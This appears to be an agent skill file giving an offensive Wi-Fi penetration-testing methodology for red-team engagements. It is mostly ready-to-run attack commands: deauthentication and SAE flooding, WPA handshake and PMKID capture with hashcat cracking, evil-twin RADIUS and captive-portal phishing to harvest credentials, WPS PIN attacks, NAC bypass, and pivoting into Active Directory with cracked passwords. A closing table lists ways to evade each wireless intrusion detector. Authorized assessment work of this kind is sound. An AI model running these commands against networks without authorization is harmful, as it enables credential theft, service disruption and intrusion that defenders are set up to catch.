---
name: offensive-wifi
description: Wireless / 802.11 attack methodology for red team engagements and wireless
  security assessments. Covers monitor-mode setup, WPA/WPA2-PSK handshake capture
  and PMKID attacks, WPA3 SAE downgrade and Dragonblood, WPA-Enterprise (EAP) attacks
  (MSCHAPv2 cracking, EAP-TLS cert theft, evil-twin RADIUS), Karma / Known Beacons
  / Mana evil twin attacks, captive-portal phishing, KRACK and FragAttacks, WPS Pixie
  Dust, deauthentication and disassociation attacks, rogue AP construction (hostapd-mana),
  802.1X bypass, MAC randomization defeat, BLE/Zigbee/IEEE 802.15.4 sidebands, and
  Wi-Fi 6/6E/7 considerations. Use when scoping wireless pentest, war-driving an estate,
  or testing corporate wireless segmentation.
---

# Wireless / 802.11 — Offensive Testing Methodology

## Quick Workflow

1. Pick the right adapter (monitor mode + injection + correct band/PHY for target)
2. Recon airspace passively — never deauth before you know the topology
3. Choose attack: handshake capture, PMKID, evil twin, KARMA, or WPS
4. Crack offline; do not rely on online dictionary attacks
5. If WPA-Enterprise, pivot through stolen creds or rogue RADIUS

---

## Hardware & Adapter Selection

| Chipset | Strengths | Notes |
|---------|-----------|-------|
| Atheros AR9271 (Alfa AWUS036NHA) | Solid 2.4 GHz monitor + injection | 802.11n only |
| Realtek RTL8812AU (AWUS036ACH) | Dual-band, injection | Driver: `aircrack-ng/rtl8812au` |
| MediaTek MT7612U (AWUS036ACM) | Stable dual-band | Modern kernels in-tree |
| MediaTek MT7921AU | Wi-Fi 6 monitor (limited) | Patched drivers required |
| AWUS036AXML / AXM | Wi-Fi 6E (6 GHz) | Bleeding edge — verify per release |

```bash
# Verify monitor + injection
sudo airmon-ng check kill
sudo airmon-ng start wlan0
sudo aireplay-ng --test wlan0mon
iw list | grep -A 8 "Supported interface modes"
```

---

## Reconnaissance

```bash
# Multi-channel discovery (all bands)
sudo airodump-ng wlan0mon --band abg

# Targeted on a known channel/BSSID
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w cap wlan0mon

# Hidden SSID — wait for client probe or force deauth
sudo airodump-ng -c 6 --essid-regex "." wlan0mon

# Wigle / Kismet for war-driving
kismet -c wlan0mon
```

**Key data to record:** BSSID, ESSID, channel, encryption, PMF status, client list, RSSI, vendor OUI.

---

## WPA / WPA2-PSK

### Four-way Handshake Capture

```bash
# Targeted capture
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w handshake wlan0mon

# Force a reconnect (deauth one client, do not blanket the AP)
sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon
```

Verify the EAPOL frames are usable:

```bash
hcxpcapngtool -o hash.hc22000 handshake-01.cap
```

### PMKID (No Client Required)

PMKID lives in the first AP-to-station message — you can grab it without anyone connected.

```bash
sudo hcxdumptool -i wlan0mon -o pmkid.pcapng \
  --enable_status=1 --filterlist_ap=targets.txt --filtermode=2

hcxpcapngtool -o hash.hc22000 pmkid.pcapng
```

### Cracking

```bash
# GPU dictionary attack
hashcat -m 22000 hash.hc22000 wordlist.txt -r rules/OneRuleToRuleThemAll.rule

# Mask attack (e.g. carrier defaults: 10 digits)
hashcat -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d?d?d

# Known SSID-based defaults (e.g. UPC, Sky, BTHub generators)
upc_keys ESSID | hashcat -m 22000 hash.hc22000 -
```

---

## WPA3 / SAE

### Transition-Mode Downgrade

If the AP advertises both WPA2 and WPA3 (transition mode), force clients onto WPA2 by spoofing an RSN-only beacon and capturing as PSK.

### Dragonblood (CVE-2019-9494/9495/13377)

Side-channel and downgrade attacks on SAE. Older hostapd (<2.10) with insufficient curve diversification leaks password elements via timing/cache attacks.

```bash
# Reference implementation
git clone https://github.com/vanhoefm/dragonblood
python3 dragondrain.py wlan0mon AA:BB:CC:DD:EE:FF
python3 dragontime.py --bssid AA:BB:CC:DD:EE:FF --iface wlan0mon
```

### SAE Auth Flooding (Resource Exhaustion)

```bash
sudo mdk4 wlan0mon a -a AA:BB:CC:DD:EE:FF -m -s 1024
# Triggers heavy crypto on AP CPU; can DoS lower-end deployments
```

---

## WPA-Enterprise (802.1X / EAP)

### Method Identification

```bash
# Watch initial EAP-Request/Identity to fingerprint method
tshark -i wlan0mon -Y "eapol || eap" -V
```

| Inner Method | Attack |
|--------------|--------|
| EAP-MSCHAPv2 (PEAP/TTLS) | Crack NetNTLMv1-style challenge offline |
| EAP-GTC | Cleartext password — capture via rogue RADIUS |
| EAP-TLS | Steal client cert (often in user keychain / DPAPI / NDES) |
| EAP-PWD | Dragonblood-class side channels |

### Evil-Twin RADIUS (MSCHAPv2 / GTC)

```bash
# eaphammer — automated rogue AP + RADIUS
eaphammer -i wlan0 --essid CorpWiFi --bssid AA:BB:CC:DD:EE:FF \
  --auth wpa-eap --creds

# Captured hashes → asleap or hashcat -m 5500
asleap -C challenge -R response -W wordlist.txt
```

**Critical:** organizations that don't pin server cert + CN on supplicants are vulnerable. Win10/11 with `ServerValidation` disabled (common for BYOD) will hand over creds.

### EAP-TLS Cert Theft Paths

- DPAPI master key + cert blob from user profile (`%APPDATA%\Microsoft\SystemCertificates`)
- NDES misconfig (ESC8-class cert request abuse)
- ADCS user auto-enrollment template with weak ACL

---

## WPS

### Pixie Dust (Offline)

```bash
# Capture WPS exchange
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -K 1 -vvv
# Or
bully -b AA:BB:CC:DD:EE:FF -d -v 3 wlan0mon
```

Vulnerable chipsets: Ralink, Realtek, Broadcom (older firmware), MediaTek (specific revs). Pixiewps recovers PIN in seconds when nonces are predictable.

### Online PIN Brute (Last Resort)

```bash
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -L -N -d 15 -t 30 -T .5 -r 3:30
# Most modern APs lock out after a few failures — slow and noisy
```

---

## Evil Twin / KARMA / Mana

### Stock Evil Twin (Captive Portal)

```bash
# wifiphisher — automated AP + phishing portal
sudo wifiphisher --essid CorpWiFi --noextensions --force-hostapd

# airgeddon — interactive menu (good for one-off engagements)
sudo airgeddon
```

### KARMA / Mana (Probe Exploitation)

Older stations broadcast PNL (Preferred Network List) probes. KARMA replies "yes" to anything; Mana picks one realistic ESSID and answers consistently to defeat MAC randomization.

```bash
# hostapd-mana
sudo hostapd-mana ./mana.conf

# Combine with rogue RADIUS for enterprise nets
eaphammer -i wlan0 --known-beacons --known-ssids-file ssids.txt \
  --auth wpa-eap --creds --hostile-portal
```

### MAC Randomization Defeat

iOS/Android randomize MACs but leak per-SSID stable IDs. Cluster probes by sequence number and timing to re-identify devices.

---

## KRACK & FragAttacks

| Attack | Class | Target |
|--------|-------|--------|
| KRACK (CVE-2017-13077..082) | Key reinstallation | Unpatched WPA2 supplicants |
| FragAttacks (CVE-2020-24586..588) | Fragmentation/aggregation | Most pre-2021 implementations |

Test a network's patch status:

```bash
# Vanhoef test scripts
git clone https://github.com/vanhoefm/krackattacks-scripts
./krack-test-client.py
git clone https://github.com/vanhoefm/fragattacks
./test-fragattacks.py wlan0
```

---

## Deauth / Disassociation Attacks

```bash
# Single client deauth (use for handshake capture)
aireplay-ng --deauth 3 -a AP -c CLIENT wlan0mon

# Broadcast (DoS — only with explicit authorization)
mdk4 wlan0mon d -B target_bssids.txt

# Disassoc + auth flood combo (kicks then prevents reconnect)
mdk4 wlan0mon a -a AP_BSSID -m
```

802.11w (PMF) blocks unencrypted deauth. Most modern enterprise APs require it. Clients without PMF support are still kickable via `Action` frames.

---

## 802.1X / Wired NAC Bypass (Adjacent)

```bash
# Sniff valid 802.1X exchange on wired side
tcpdump -i eth0 -w nac.pcap ether proto 0x888e

# silentbridge / nac_bypass — transparently bridge through an authenticated host
git clone https://github.com/s0lst1c3/silentbridge
silentbridge --takeover --phy wlan0  # variants for wired
```

---

## Wi-Fi 6 / 6E / 7 Considerations

- **6 GHz (Wi-Fi 6E)** disables WPA2-only; WPA3 + PMF mandatory. Many attacks are mitigated by spec.
- **OFDMA / MU-MIMO**: legacy injection often misaligns with RU allocations — verify packet delivery on test bench.
- **TWT (Target Wake Time)**: deauth windows differ; observe BA sessions before injecting.
- **MLO (Wi-Fi 7)**: a single client over multiple links — capture must cover all links to recover full session.

---

## Sidebands & Adjacent Wireless

| Tech | Tool | Notes |
|------|------|-------|
| Bluetooth Classic | `redfang`, `crackle`, `btproxy` | LMP/L2CAP fuzzing |
| BLE | `bettercap`, `Sniffle` (TI CC1352), `Frontline` | GATT enumeration, LE Secure Connections downgrade |
| Zigbee / 802.15.4 | `KillerBee`, `apimote`, `ATUSB` | Touchlink commissioning abuse |
| Z-Wave | `Z-Force`, `EZ-Wave` | S0 key reuse bug class |
| LoRa / LoRaWAN | `LoRaPWN`, `ChirpStack` | Join-request replay, ABP key reuse |
| 433/868 MHz (Sub-GHz) | HackRF / Flipper Zero | Garage doors, doorbells, telemetry |

---

## RADIUS / Backend Pivots Post-Compromise

```bash
# If you crack a domain user via PEAP-MSCHAPv2, pivot to AD
nxc smb dc -u captured_user -p cracked_pass --pass-pol

# If RADIUS server is stand-alone (FreeRADIUS), check users file & MOTP secrets
# If on Windows NPS, pivot via the service account context
```

---

## Engagement Cheatsheet

```bash
# 1. Setup
sudo airmon-ng check kill && sudo airmon-ng start wlan0
sudo iw reg set US

# 2. Recon (do not deauth yet)
sudo airodump-ng wlan0mon --band abg --write recon

# 3. PMKID sweep (passive)
sudo hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1

# 4. Targeted capture if PMKID empty
sudo airodump-ng -c <ch> --bssid <AP> -w cap wlan0mon &
sudo aireplay-ng --deauth 3 -a <AP> -c <client> wlan0mon

# 5. Crack offline
hashcat -m 22000 hash.hc22000 wordlist.txt -r best64.rule

# 6. If enterprise → eaphammer evil twin
# 7. Document SSID, BSSID, channel, RSSI, encryption, attack used, time
```

---

## Detection / Defender View

| AP/WIDS Detector | Trigger | Evasion |
|------------------|---------|---------|
| Excessive deauth | >5 deauth/sec from one source MAC | Spread across spoofed MACs, target individuals |
| Rogue AP detection | Unauthorized BSSID on monitored channel | Match real BSSID's beacon timing/IE order exactly |
| Karma response anomaly | AP answering all probe SSIDs | Use Mana mode, pick one plausible SSID |
| WPS lockout | Repeated PIN failures | Pixie Dust offline only, abandon online brute |
| RADIUS log: cert mismatch | Supplicant rejects evil-twin cert | Use copies of victim CA-signed certs (unlikely) |

---

## Key References

- MITRE ATT&CK: T1200 (Hardware Additions), T1557.004 (AiTM via Evil Twin)
- IEEE 802.11-2020 (combined spec including KRACK mitigations)
- WPA3 Spec / Wi-Fi Alliance: dragonblood.net for vuln tracking
- hcxtools / hashcat WPA modes: docs at hashcat.net
- Source: https://github.com/SnailSploit/offensive-checklist/blob/main/wireless.md
